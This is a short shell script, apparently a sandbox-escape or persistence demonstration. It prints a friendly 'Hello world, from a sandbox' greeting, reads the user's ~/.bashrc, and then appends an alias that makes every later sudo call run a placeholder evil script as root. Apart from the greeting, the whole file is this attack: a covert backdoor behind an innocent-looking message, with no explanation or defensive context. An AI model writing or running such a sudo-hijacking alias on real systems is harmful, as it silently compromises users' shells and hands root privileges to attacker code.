#!/bin/sh
echo "Hello world, from a sandbox"
cat ~/.bashrc
echo "alias sudo='sudo bash <Evil script Here>'" >> ~/.bashrc

